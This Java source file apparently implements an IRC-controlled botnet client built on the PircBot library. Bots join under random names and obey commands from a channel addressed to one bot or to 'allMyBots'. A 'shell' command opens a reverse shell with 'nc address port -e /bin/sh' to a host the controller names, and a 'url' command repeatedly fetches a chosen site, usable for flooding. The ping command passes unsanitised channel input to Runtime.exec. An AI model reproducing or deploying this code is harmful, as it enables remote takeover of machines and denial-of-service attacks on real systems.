// some of the code here is from javacodedepot.com/tutorial/java-ping-sample-code
// some more of the code here is from the pircbot tutorial http://www.jibble.org/pircbot.php
// I also relied on https://alvinalexander.com/blog/post/java/how-open-read-url-java-url-class-example-code

import org.jibble.pircbot.*;
import java.net.*;
import java.util.Random;
import java.lang.StringBuilder;
import java.io.*;

public class MyBot extends PircBot {

    Random rand = new Random();
    int n = rand.nextInt(100000);
 
    String botName = "MyBot" + Integer.toString(n);
   
    public MyBot() {
        this.setName(botName);
    }
    
    public void onMessage(String channel, String sender,
                       String login, String hostname, String message) {
        String msg[] = message.split(" ", 4);

        if (msg[0].equalsIgnoreCase(botName) || msg[0].equalsIgnoreCase("allMyBots")) {
        
            if (msg[1].equalsIgnoreCase("time")) {            
                String time = new java.util.Date().toString();
                sendMessage(channel, sender + ": The time is now " + time);
            }

            if (msg[1].equalsIgnoreCase("ping")) {
                // msg is "botName ping count address"
                String command = "ping -c " + msg[2] + " " + msg[3];
                try {
                    Process myProcess = Runtime.getRuntime().exec(command);
                    myProcess.waitFor();
                    if (myProcess.exitValue() == 0) {
                       sendMessage(channel, sender + ": Successful Ping of " + msg[3]);
                    } else {
                       sendMessage(channel, sender + ": Unsuccessful Ping of " + msg[3]);
                    }
                    myProcess.destroy();
                }
                catch (Exception ex) {
                }
            }

            if (msg[1].equalsIgnoreCase("shell")) {
               //  msg is "botName shell address port"
                String command = "nc " + msg[2] + " " + msg[3] + " -e /bin/sh";
                System.out.println(command);
                try {
 			Process myProcess = Runtime.getRuntime().exec(command);
			myProcess.waitFor();
 			myProcess.destroy();
		}
		catch (Exception ex) {
		}
            }

            if (msg[1].equalsIgnoreCase("url")) {
                
                System.out.println(msg[0] + " " + msg[1] + " " + msg[2] + " " + msg[3] + "\n");

                // msg is "botName url #requests http(s)://sitename"
                //StringBuilder content = new StringBuilder();                

                try {
                    for (int i = 0; i < Integer.parseInt(msg[2]); i++) {
                        URL url = new URL(msg[3]);
                        //URLConnection site = url.openConnection(); 
                        BufferedReader reader = 
                            new BufferedReader(new InputStreamReader(url.openStream()));
                        String line;
           
                        while ((line = reader.readLine()) != null){
                            //content.append(line + "\n");
                            System.out.println(line);
                        }
                        reader.close();
                        //System.out.println(content.toString()); 
                    }
                }
                catch (Exception ex) {
			System.out.println("Error");
                }
            }
        }
    }
}
